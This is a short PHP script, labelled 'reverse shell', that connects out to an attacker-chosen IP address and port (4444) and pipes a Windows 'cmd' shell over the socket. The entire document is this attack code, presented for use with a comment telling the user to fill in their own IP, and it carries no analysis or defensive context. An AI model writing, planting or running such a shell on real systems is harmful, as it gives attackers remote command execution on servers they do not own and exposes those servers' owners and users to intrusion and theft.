<?php
// reverse shell
set_time_limit(0);
$ip = '127.0.0.1'; // Your IP address
$port = 4444; // The port to connect back
$sock = fsockopen($ip, $port);
$proc = proc_open('cmd', [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
while (true) {
    fwrite($sock, fread($pipes[1], 2048));
    fwrite($pipes[0], fread($sock, 2048));
}
?>
